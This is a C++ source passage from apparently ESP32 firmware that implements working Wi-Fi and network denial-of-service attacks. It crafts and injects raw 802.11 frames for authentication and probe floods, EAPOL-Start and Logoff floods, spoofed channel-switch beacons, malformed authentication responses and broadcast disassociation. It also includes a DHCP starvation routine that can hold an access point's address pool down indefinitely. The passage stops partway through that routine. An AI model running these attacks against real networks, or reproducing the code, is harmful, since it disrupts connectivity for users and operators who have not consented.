#include "more_atks.h"

#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "wifi_atks.h"
#include "wifi_raw_portal.h"

#include <WiFi.h>
#include <esp_netif.h>
#include <esp_netif_net_stack.h>
#include <esp_wifi.h>
#include <globals.h>
#include <lwip/inet.h>
#include <lwip/netif.h>
#include <lwip/pbuf.h>
#include <lwip/sockets.h>
#include <sys/select.h>

extern bool showHiddenNetworks;

// ============================================================================
// Frame builders
//
// Every builder writes into a caller-supplied buffer and returns the frame
// length. Sequence numbers come from a file-local counter so consecutive frames
// do not look identical to the receiver.
// ============================================================================

static uint16_t moreSeq = 0;

static void moreWriteSeq(uint8_t *frame, size_t offset) {
    moreSeq = (moreSeq + 1) & 0x0FFF;
    // 802.11 sequence control: 4 bits fragment (0) then 12 bits sequence.
    frame[offset] = (uint8_t)((moreSeq << 4) & 0xF0);
    frame[offset + 1] = (uint8_t)((moreSeq >> 4) & 0xFF);
}

static void moreRandomMac(uint8_t *mac) {
    mac[0] = (uint8_t)((random(0, 256) & 0xFE) | 0x02); // locally administered, unicast
    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
}

static const uint8_t moreBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

/// Random printable SSID, 5..24 characters.
static String moreRandomSSID() {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int len = random(5, 25);
    String s;
    for (int i = 0; i < len; i++) s += charset[random(0, (int)sizeof(charset) - 1)];
    return s;
}

/// IEEE 802.11 probe request (subtype 4).
static size_t moreBuildProbeReq(uint8_t *f, const uint8_t *sa, const String &ssid) {
    size_t n = 0;
    f[n++] = 0x40; // frame control: management, probe request
    f[n++] = 0x00;
    f[n++] = 0x00; // duration
    f[n++] = 0x00;
    memcpy(&f[n], moreBroadcast, 6);
    n += 6; // addr1 = DA (broadcast)
    memcpy(&f[n], sa, 6);
    n += 6; // addr2 = SA
    memcpy(&f[n], moreBroadcast, 6);
    n += 6;      // addr3 = BSSID (broadcast)
    moreWriteSeq(f, n);
    n += 2;

    size_t ssidLen = ssid.length();
    if (ssidLen > 32) ssidLen = 32;
    f[n++] = 0x00; // SSID element
    f[n++] = (uint8_t)ssidLen;
    if (ssidLen) {
        memcpy(&f[n], ssid.c_str(), ssidLen);
        n += ssidLen;
    }

    static const uint8_t rates[] = {0x01, 0x04, 0x82, 0x84, 0x8B, 0x96};
    memcpy(&f[n], rates, sizeof(rates));
    n += sizeof(rates);
    return n;
}

/// IEEE 802.11 authentication frame (subtype 11). `algorithm` 0 = open system;
/// an unknown algorithm is what the "bad message" path uses.
static size_t moreBuildAuth(
    uint8_t *f, const uint8_t *da, const uint8_t *sa, const uint8_t *bssid, uint16_t algorithm, uint16_t status
) {
    size_t n = 0;
    f[n++] = 0xB0;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    memcpy(&f[n], da, 6);
    n += 6;
    memcpy(&f[n], sa, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    moreWriteSeq(f, n);
    n += 2;
    f[n++] = (uint8_t)(algorithm & 0xFF);
    f[n++] = (uint8_t)(algorithm >> 8);
    f[n++] = 0x01; // authentication transaction sequence: 1
    f[n++] = 0x00;
    f[n++] = (uint8_t)(status & 0xFF);
    f[n++] = (uint8_t)(status >> 8);
    return n;
}

/// IEEE 802.11 association response (subtype 1) with a failure status code.
static size_t moreBuildAssocResp(uint8_t *f, const uint8_t *da, const uint8_t *bssid, uint16_t status) {
    size_t n = 0;
    f[n++] = 0x10;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    memcpy(&f[n], da, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    moreWriteSeq(f, n);
    n += 2;
    f[n++] = 0x01; // capability: ESS
    f[n++] = 0x00;
    f[n++] = (uint8_t)(status & 0xFF);
    f[n++] = (uint8_t)(status >> 8);
    f[n++] = 0x01; // association id
    f[n++] = 0x00;
    return n;
}

/// IEEE 802.11 disassociation frame (subtype 10).
static size_t moreBuildDisassoc(
    uint8_t *f, const uint8_t *da, const uint8_t *sa, const uint8_t *bssid, uint16_t reason
) {
    size_t n = 0;
    f[n++] = 0xA0;
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    memcpy(&f[n], da, 6);
    n += 6;
    memcpy(&f[n], sa, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    moreWriteSeq(f, n);
    n += 2;
    f[n++] = (uint8_t)(reason & 0xFF);
    f[n++] = (uint8_t)(reason >> 8);
    return n;
}

/// 802.11 data frame carrying an EAPOL frame (LLC/SNAP 0x888E).
/// toDs true  = supplicant -> AP  (raf = bssid, ta = client)
/// toDs false = AP -> supplicant  (raf = client, ta = bssid, sa = client)
static size_t moreBuildEapol(uint8_t *f, const uint8_t *client, const uint8_t *bssid, uint8_t eapolType, bool toDs) {
    size_t n = 0;
    f[n++] = 0x08;                        // frame control: data
    f[n++] = toDs ? 0x01 : 0x02;          // ... ToDS / FromDS
    f[n++] = 0x00;
    f[n++] = 0x00;
    if (toDs) {
        memcpy(&f[n], bssid, 6);
        n += 6; // addr1 = RA/BSSID
        memcpy(&f[n], client, 6);
        n += 6; // addr2 = TA/client
        memcpy(&f[n], bssid, 6);
        n += 6; // addr3 = SA/BSSID
    } else {
        memcpy(&f[n], client, 6);
        n += 6; // addr1 = DA/client
        memcpy(&f[n], bssid, 6);
        n += 6; // addr2 = TA/BSSID
        memcpy(&f[n], client, 6);
        n += 6; // addr3 = SA/client
    }
    moreWriteSeq(f, n);
    n += 2;

    static const uint8_t llcSnap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    memcpy(&f[n], llcSnap, sizeof(llcSnap));
    n += sizeof(llcSnap);

    f[n++] = 0x02;       // EAPOL version 2
    f[n++] = eapolType;  // 1 = Start, 2 = Logoff, 3 = Key
    f[n++] = 0x00;       // length 0
    f[n++] = 0x00;
    return n;
}

/// Beacon with a Channel Switch Announcement element (ID 37) so clients follow
/// the fake BSSID onto `newChannel`.
static size_t moreBuildCsaBeacon(
    uint8_t *f, const uint8_t *bssid, const String &ssid, uint8_t curChannel, uint8_t newChannel, uint8_t count
) {
    size_t n = 0;
    f[n++] = 0x80; // beacon
    f[n++] = 0x00;
    f[n++] = 0x00;
    f[n++] = 0x00;
    memcpy(&f[n], moreBroadcast, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    memcpy(&f[n], bssid, 6);
    n += 6;
    moreWriteSeq(f, n);
    n += 2;

    for (int i = 0; i < 8; i++) f[n++] = 0x00; // timestamp
    f[n++] = 0x64;                             // beacon interval 100
    f[n++] = 0x00;
    f[n++] = 0x01; // capability: ESS
    f[n++] = 0x00;

    size_t ssidLen = ssid.length();
    if (ssidLen > 32) ssidLen = 32;
    f[n++] = 0x00;
    f[n++] = (uint8_t)ssidLen;
    if (ssidLen) {
        memcpy(&f[n], ssid.c_str(), ssidLen);
        n += ssidLen;
    }

    static const uint8_t rates[] = {0x01, 0x04, 0x82, 0x84, 0x8B, 0x96};
    memcpy(&f[n], rates, sizeof(rates));
    n += sizeof(rates);

    f[n++] = 0x03; // DS parameter set
    f[n++] = 0x01;
    f[n++] = curChannel;

    f[n++] = 0x25; // Channel Switch Announcement
    f[n++] = 0x03;
    f[n++] = 0x01; // mode: stop transmitting until the switch
    f[n++] = newChannel;
    f[n++] = count;
    return n;
}

/// Send one frame through the hardened raw-TX path. Returns frames accepted.
static uint32_t moreSend(const uint8_t *frame, size_t len, uint8_t channel, uint8_t repeat = 1) {
    WifiRawTxResult r = wifi_raw_inject(frame, len, channel, repeat, -1, false, 0);
    return r.ok ? (uint32_t)r.sent : 0;
}

// ============================================================================
// AP discovery
// ============================================================================

struct MoreAp {
    uint8_t bssid[6];
    uint8_t channel;
    String ssid;
    uint8_t auth = 0;
};

static int moreScanAps(std::vector<MoreAp> &aps, int maxAps = 24) {
    aps.clear();
    int nets = wifiScanNets(showHiddenNetworks);
    for (int i = 0; i < nets && (int)aps.size() < maxAps; i++) {
        uint8_t ch = (uint8_t)WiFi.channel(i);
        if (ch == 0) continue;
        MoreAp ap;
        memcpy(ap.bssid, WiFi.BSSID(i), 6);
        ap.channel = ch;
        ap.ssid = WiFi.SSID(i);
        ap.auth = (uint8_t)WiFi.encryptionType(i);
        aps.push_back(ap);
    }
    WiFi.scanDelete();
    return (int)aps.size();
}

// Shared timing loop used by every attack.
static bool moreTimeLeft(uint32_t start, uint32_t durationMs) { return (int32_t)(start + durationMs - millis()) > 0; }

static void moreTick(uint32_t frames, uint32_t start, const MoreProgressFn &progress, uint32_t &lastTick) {
    uint32_t now = millis();
    if (progress && (now - lastTick) >= 250) {
        lastTick = now;
        progress(frames, now - start);
    }
}

// ============================================================================
// Flood attacks
// ============================================================================

MoreAtkResult more_auth_flood(uint32_t durationMs, const MoreProgressFn &progress) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    std::vector<MoreAp> aps;
    res.targets = moreScanAps(aps);
    if (res.targets == 0) {
        res.error = "no access points found";
        wifi_atk_unsetWifi();
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        for (const auto &ap : aps) {
            for (int i = 0; i < 8; i++) {
                uint8_t sa[6];
                moreRandomMac(sa);
                size_t len = moreBuildAuth(frame, ap.bssid, sa, ap.bssid, 0x0000, 0x0000);
                res.frames += moreSend(frame, len, ap.channel);
                if (EscPress) break;
            }
            if (EscPress) break;
            if (!moreTimeLeft(start, durationMs)) break;
        }
        moreTick(res.frames, start, progress, lastTick);
        if (EscPress) break;
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.channel = aps.empty() ? 0 : aps[0].channel;
    res.detail = String(res.targets) + " APs";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_probe_flood(
    uint32_t durationMs, const String &ssid, bool randomSSID, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[96];
    uint8_t channel = 1;
    String lastSSID = ssid;

    while (moreTimeLeft(start, durationMs)) {
        String useSSID = (randomSSID || ssid.length() == 0) ? moreRandomSSID() : ssid;
        lastSSID = useSSID;
        for (int i = 0; i < 6; i++) {
            uint8_t sa[6];
            moreRandomMac(sa);
            size_t len = moreBuildProbeReq(frame, sa, useSSID);
            res.frames += moreSend(frame, len, channel);
            if (EscPress) break;
        }
        if (++channel > 13) channel = 1;
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.targets = 1;
    res.channel = channel;
    res.detail = randomSSID ? String("random SSIDs") : lastSSID;
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_eapol_start_flood(uint32_t durationMs, const MoreProgressFn &progress) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    std::vector<MoreAp> aps;
    res.targets = moreScanAps(aps);
    if (res.targets == 0) {
        res.error = "no access points found";
        wifi_atk_unsetWifi();
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        for (const auto &ap : aps) {
            for (int i = 0; i < 8; i++) {
                uint8_t client[6];
                moreRandomMac(client);
                // EAPOL-Start (type 1) from a spoofed supplicant to the AP.
                size_t len = moreBuildEapol(frame, client, ap.bssid, 0x01, true);
                res.frames += moreSend(frame, len, ap.channel);
                if (EscPress) break;
            }
            if (EscPress) break;
            if (!moreTimeLeft(start, durationMs)) break;
        }
        moreTick(res.frames, start, progress, lastTick);
        if (EscPress) break;
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.channel = aps.empty() ? 0 : aps[0].channel;
    res.detail = String(res.targets) + " APs";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

// ============================================================================
// Targeted attacks
// ============================================================================

MoreAtkResult more_eapol_logoff(
    const uint8_t bssid[6], uint8_t channel, uint32_t durationMs, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        // Log off a handful of spoofed supplicants (broadcast is not valid for
        // EAPOL, so a spread of addresses is what covers the real clients).
        for (int i = 0; i < 16; i++) {
            uint8_t client[6];
            moreRandomMac(client);
            size_t len = moreBuildEapol(frame, client, bssid, 0x02, true);
            res.frames += moreSend(frame, len, channel, 3);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(2));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = "EAPOL-Logoff";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_channel_switch(
    const uint8_t bssid[6], const char *ssid, uint8_t channel, uint8_t newChannel, uint32_t durationMs,
    const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;
    if (newChannel < 1 || newChannel > 14) newChannel = 14;
    if (newChannel == channel) newChannel = (channel == 14) ? 1 : (uint8_t)(channel + 1);

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    String useSSID = ssid ? String(ssid) : String("");
    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[160];

    while (moreTimeLeft(start, durationMs)) {
        for (int i = 0; i < 4; i++) {
            size_t len = moreBuildCsaBeacon(frame, bssid, useSSID, channel, newChannel, 3);
            res.frames += moreSend(frame, len, channel);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(2));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = String("switch to ch ") + String(newChannel);
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_bad_message(
    const uint8_t bssid[6], uint8_t channel, uint32_t durationMs, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        for (int i = 0; i < 16; i++) {
            uint8_t client[6];
            moreRandomMac(client);
            uint8_t variant = (uint8_t)random(0, 3);
            size_t len;
            if (variant == 0) {
                // Association response claiming the association failed.
                len = moreBuildAssocResp(frame, client, bssid, 0x0001);
            } else if (variant == 1) {
                // Authentication response with an algorithm the client never asked for.
                len = moreBuildAuth(frame, client, bssid, bssid, 0xFFFF, 0x0001);
            } else {
                // Authentication response with an out-of-sequence transaction id.
                len = moreBuildAuth(frame, client, bssid, bssid, 0x0000, 0x000D);
            }
            res.frames += moreSend(frame, len, channel, 2);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(2));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = "malformed responses";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_auth_attack(
    const uint8_t bssid[6], uint8_t channel, uint32_t durationMs, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];

    while (moreTimeLeft(start, durationMs)) {
        for (int i = 0; i < 24; i++) {
            uint8_t sa[6];
            moreRandomMac(sa);
            size_t len = moreBuildAuth(frame, bssid, sa, bssid, 0x0000, 0x0000);
            res.frames += moreSend(frame, len, channel);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = "auth requests";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

MoreAtkResult more_disassoc_attack(
    const uint8_t bssid[6], uint8_t channel, uint32_t durationMs, const MoreProgressFn &progress
) {
    MoreAtkResult res;
    if (durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;

    if (!wifi_atk_setWifi()) {
        res.error = "failed to start WiFi";
        return res;
    }

    uint32_t start = millis();
    uint32_t lastTick = 0;
    uint8_t frame[64];
    static const uint16_t reasons[] = {0x0007, 0x0003, 0x0006, 0x0008};

    while (moreTimeLeft(start, durationMs)) {
        for (int i = 0; i < 32; i++) {
            // From the AP to every client (broadcast receiver).
            uint16_t reason = reasons[random(0, 4)];
            size_t len = moreBuildDisassoc(frame, moreBroadcast, bssid, bssid, reason);
            res.frames += moreSend(frame, len, channel);
            if (EscPress) break;
        }
        if (EscPress) break;
        moreTick(res.frames, start, progress, lastTick);
        vTaskDelay(pdMS_TO_TICKS(1));
    }

    res.channel = channel;
    res.targets = 1;
    res.detail = "disassoc broadcast";
    res.ok = true;
    res.seconds = (millis() - start) / 1000; // console reports this as the wall clock
    wifi_atk_unsetWifi();
    return res;
}

// ============================================================================
// DHCP starvation
// ============================================================================

/// DHCPDISCOVER on the wire: BOOTP fixed block + magic cookie + option 53 + end.
///
/// Same layout the Ethernet DHCPStarvation attack builds (op/htype/hlen, the
/// broadcast flag, zeroed addresses, chaddr at offset 28, cookie at 236). It is
/// wrapped in Ethernet/IPv4/UDP by moreSendDhcpFrame() below, because on Wi-Fi
/// the frame has to come from the associated station itself.
#define MORE_DHCP_DISCOVER_LEN 244

static size_t moreBuildDhcpDiscover(uint8_t *out, size_t cap, const uint8_t chaddr[6]) {
    if (out == NULL || chaddr == NULL || cap < MORE_DHCP_DISCOVER_LEN) return 0;
    memset(out, 0, MORE_DHCP_DISCOVER_LEN);
    out[0] = 0x01; // BOOTREQUEST
    out[1] = 0x01; // Ethernet
    out[2] = 0x06; // hardware address length
    uint32_t xid = (uint32_t)random(0x7FFFFFFF);
    out[4] = (uint8_t)(xid >> 24);
    out[5] = (uint8_t)(xid >> 16);
    out[6] = (uint8_t)(xid >> 8);
    out[7] = (uint8_t)xid;
    // Broadcast flag: this chaddr is not the radio's MAC, so only a broadcast
    // OFFER can ever be delivered back to us.
    out[10] = 0x80;
    out[11] = 0x00;
    memcpy(out + 28, chaddr, 6);
    out[236] = 0x63; // magic cookie
    out[237] = 0x82;
    out[238] = 0x53;
    out[239] = 0x63;
    out[240] = 0x35; // option 53: DHCP message type
    out[241] = 0x01;
    out[242] = 0x01; // DHCPDISCOVER
    out[243] = 0xFF; // end
    return MORE_DHCP_DISCOVER_LEN;
}

/// DHCP option lookup in a BOOTP packet (options start at offset 240).
static bool moreDhcpOption(const uint8_t *pkt, size_t len, uint8_t code, const uint8_t **val, size_t *vlen) {
    if (pkt == NULL || len < 240) return false;
    size_t i = 240;
    while (i < len) {
        uint8_t c = pkt[i++];
        if (c == 0xFF) break;
        if (c == 0) continue;
        if (i >= len) break;
        uint8_t l = pkt[i++];
        if (i + l > len) break;
        if (c == code) {
            if (val) *val = pkt + i;
            if (vlen) *vlen = l;
            return true;
        }
        i += l;
    }
    return false;
}

#define MORE_DHCP_SELECT_LEN 256

/// DHCPREQUEST that selects the lease the server just offered: same xid and
/// chaddr as the DISCOVER, option 50 = offered address, option 54 = server id.
/// Android NAKs an INIT-REBOOT request for an address it did not offer, so the
/// offer has to be answered, not guessed.
static size_t moreBuildDhcpSelect(
    uint8_t *out, size_t cap, const uint8_t chaddr[6], uint32_t xid, uint32_t yiaddr, const uint8_t sid[4]
) {
    if (out == NULL || chaddr == NULL || sid == NULL || cap < MORE_DHCP_SELECT_LEN) return 0;
    if (moreBuildDhcpDiscover(out, MORE_DHCP_SELECT_LEN, chaddr) == 0) return 0;
    out[4] = (uint8_t)(xid >> 24);
    out[5] = (uint8_t)(xid >> 16);
    out[6] = (uint8_t)(xid >> 8);
    out[7] = (uint8_t)xid;
    out[242] = 0x03; // DHCPREQUEST
    size_t i = 243;
    out[i++] = 0x32; // option 50: requested IP address
    out[i++] = 0x04;
    memcpy(out + i, &yiaddr, 4);
    i += 4;
    out[i++] = 0x36; // option 54: server identifier
    out[i++] = 0x04;
    memcpy(out + i, sid, 4);
    i += 4;
    out[i++] = 0xFF; // end
    return i;
}

/// Pull the offered address and server id out of a broadcast DHCPOFFER.
static bool moreParseDhcpOffer(
    const uint8_t *pkt, int len, uint32_t xid, uint32_t *yiaddr, uint8_t sid[4]
) {
    if (pkt == NULL || len < 244 || pkt[0] != 0x02) return false; // BOOTREPLY
    const uint32_t rxid = ((uint32_t)pkt[4] << 24) | ((uint32_t)pkt[5] << 16) | ((uint32_t)pkt[6] << 8) | pkt[7];
    if (rxid != xid) return false;
    const uint8_t *v = NULL;
    size_t vlen = 0;
    if (!moreDhcpOption(pkt, (size_t)len, 53, &v, &vlen) || vlen != 1 || v[0] != 0x02) return false;
    memcpy(yiaddr, pkt + 16, 4);
    if (moreDhcpOption(pkt, (size_t)len, 54, &v, &vlen) && vlen == 4) memcpy(sid, v, 4);
    else memset(sid, 0, 4);
    return true;
}

/// One's-complement checksum; `sum` seeds it for the UDP pseudo-header.
static uint16_t moreChecksum(const uint8_t *data, size_t len, uint32_t sum) {
    for (size_t i = 0; i + 1 < len; i += 2) sum += ((uint16_t)data[i] << 8) | data[i + 1];
    if (len & 1) sum += (uint16_t)data[len - 1] << 8;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

/// The station netif lwIP hands frames to.
static struct netif *moreStaNetif() {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    return sta ? (struct netif *)esp_netif_get_netif_impl(sta) : NULL;
}

/// Wrap a DHCP datagram in Ethernet/IPv4/UDP and send it from the joined
/// station, source 0.0.0.0:68. A plain socket cannot be used: it gets an
/// ephemeral port (Android drops anything but 68) and port 68 cannot be bound
/// while the station's own DHCP client holds it. Raw frames leave that client,
/// its address and its route untouched.
static bool moreSendDhcpFrame(struct netif *iface, const uint8_t *dhcp, size_t dhcpLen) {
    if (iface == NULL || iface->linkoutput == NULL || dhcp == NULL || dhcpLen == 0) return false;
    const size_t ipLen = 20 + 8 + dhcpLen;
    const size_t frameLen = 14 + ipLen;
    if (frameLen > 0xFFFF) return false;

    struct pbuf *p = pbuf_alloc(PBUF_RAW, frameLen, PBUF_RAM);
    if (p == NULL) return false;
    uint8_t *frame = (uint8_t *)p->payload;

    memset(frame, 0xFF, 6);              // broadcast to the AP's DHCP server
    memcpy(frame + 6, iface->hwaddr, 6); // the associated station
    frame[12] = 0x08;
    frame[13] = 0x00; // IPv4

    uint8_t *ip = frame + 14;
    memset(ip, 0, 20 + 8);
    ip[0] = 0x45; // IPv4, 20-byte header
    ip[2] = (uint8_t)(ipLen >> 8);
    ip[3] = (uint8_t)ipLen;
    ip[8] = 64; // TTL
    ip[9] = 17; // UDP
    memset(ip + 16, 0xFF, 4); // 255.255.255.255
    uint16_t ipCk = moreChecksum(ip, 20, 0);
    ip[10] = (uint8_t)(ipCk >> 8);
    ip[11] = (uint8_t)ipCk;

    uint8_t *udp = ip + 20;
    udp[1] = 68; // DHCP client port; servers drop anything else
    udp[3] = 67; // DHCP server port
    uint16_t udpLen = (uint16_t)(8 + dhcpLen);
    udp[4] = (uint8_t)(udpLen >> 8);
    udp[5] = (uint8_t)udpLen;
    memcpy(udp + 8, dhcp, dhcpLen);
    uint32_t pseudo = 0xFFFF + 0xFFFF; // destination 255.255.255.255
    pseudo += 17;                      // UDP protocol
    pseudo += udpLen;
    uint16_t udpCk = moreChecksum(udp, udpLen, pseudo);
    if (udpCk == 0) udpCk = 0xFFFF;
    udp[6] = (uint8_t)(udpCk >> 8);
    udp[7] = (uint8_t)udpCk;

    err_t err = iface->linkoutput(iface, p);
    pbuf_free(p);
    return err == ERR_OK;
}

MoreAtkResult more_dhcp_starvation(
    const uint8_t bssid[6], const String &ssid, const String &password, uint8_t channel, uint32_t durationMs,
    const MoreProgressFn &progress, bool untilBack
) {
    MoreAtkResult res;
    // Until-BACK mode ignores the duration and the "no offers" stop: the menu
    // entry holds the selected AP's pool (one VLAN) down for as long as the
    // operator wants, and only the BACK button ends it.
    if (!untilBack && durationMs < MORE_ATK_MIN_MS) durationMs = MORE_ATK_MIN_MS;
    if (!untilBack && durationMs > MORE_ATK_MAX_MS) durationMs = MORE_ATK_MAX_MS;
    if (ssid.length() == 0) {
        res.error = "AP has no SSID";
        return res;
    }
    if (channel < 1 || channel > 14) {
        res.error = "channel must be 1-14";
        return res;
    }

    // Report the target even when the join never happens: a failed console run
    // used to print channel=0 and an empty detail, which says nothing about
    // which AP was tried.
    res.channel = channel;
    res.detail = ssid.substring(0, 24);
    uint32_t startedAll = millis();

    // Joining is part of the attack, not a convenience: a DHCP server only sees
    // traffic the AP forwards for an associated station, so the spoofed frames
    // the other attacks send cannot reach it. GhostESP does it the same way -
    // establish one real link, then vary chaddr per DISCOVER.
    //
    // If the board is already on this SSID, keep that link: re-joining costs
    // seconds, may pick another channel, and drops a connection the user may be
    // using - the DHCP server is the same one either way. This mirrors
    // wifi_atk_unsetWifi(), which also leaves a pre-existing connection up.
    const bool alreadyJoined = WiFi.isConnected() && WiFi.SSID() == ssid;
    if (!alreadyJoined) {
        if (!wifiEnsureRadioMem()) {
            res.error = "low RAM for wifi";
            return res;
        }
        if (!_connectToWifiNetwork(ssid, password, channel, bssid)) {
            res.error = "join failed (password/range)";
            res.seconds = (millis() - startedAll) / 1000;
            wifiDisconnect();
            return res;
        }
    }

    // Android's DHCP server drops packets that do not come from UDP port 68 and
    // NAKs a REQUEST for an address it did not offer ("Invalid requested
    // address"), so this has to be the real handshake: DISCOVER with a fresh
    // chaddr, read the OFFER, then REQUEST that exact address with the same
    // chaddr. Port 68 is held by the station's DHCP client, so stop it, put the
    // same address back as a static configuration (the receive socket needs a
    // non-zero netif address to accept broadcasts), and restart it afterwards.
    struct netif *iface = moreStaNetif();
    if (iface == NULL || iface->linkoutput == NULL) {
        res.error = "no station netif";
        res.seconds = (millis() - startedAll) / 1000;
        if (!alreadyJoined) wifiDisconnect();
        return res;
    }

    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    bool dhcpcStopped = false;
    if (sta) {
        esp_netif_ip_info_t saved;
        bool haveSaved = (esp_netif_get_ip_info(sta, &saved) == ESP_OK && saved.ip.addr != 0);
        dhcpcStopped = (esp_netif_dhcpc_stop(sta) == ESP_OK);
        if (haveSaved) esp_netif_set_ip_info(sta, &saved);
    }

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        res.error = "udp socket failed";
        res.seconds = (millis() - startedAll) / 1000;
        if (dhcpcStopped) esp_netif_dhcpc_start(sta);
        if (!alreadyJoined) wifiDisconnect();
        return res;
    }
    int one = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));
    struct sockaddr_in src;
    memset(&src, 0, sizeof(src));
    src.sin_family = AF_INET;
    src.sin_port = htons(68); // DHCP client port
    src.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(sock, (struct sockaddr *)&src, sizeof(src)) != 0) {
        res.error = "bind dhcp port 68 failed";
        res.seconds = (millis() - startedAll) / 1000;
        close(sock);
        if (dhcpcStopped) esp_netif_dhcpc_start(sta);
        if (!alreadyJoined) wifiDisconnect();
        return res;
    }

    EscPress = false;
    uint32_t start = millis();
